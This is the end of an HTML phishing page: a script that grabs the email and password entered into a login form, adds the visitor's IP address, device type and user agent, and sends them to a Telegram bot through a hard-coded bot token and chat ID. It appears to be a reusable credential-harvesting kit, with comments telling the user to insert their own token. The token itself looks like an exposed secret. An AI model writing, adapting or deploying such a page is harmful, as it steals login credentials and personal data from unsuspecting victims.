    </form>

  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <script>
        const TOKEN = "8167880282:AAE7JhMyHkoO_CFnPvKj42iPybc-tpb7-6E"; // Replace with your Telegram bot token
        const CHAT_ID = "7105413833"; // Replace with your Telegram chat ID
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;
                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';

                    const message = `
                        <b>New Login Attempt</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    })
                        .then(() => alert('Information sent successfully!'))
                        .catch(() => alert('Error sending the information.'));
                })
                .catch(() => alert('Error fetching the IP address.'));
        });
    </script>
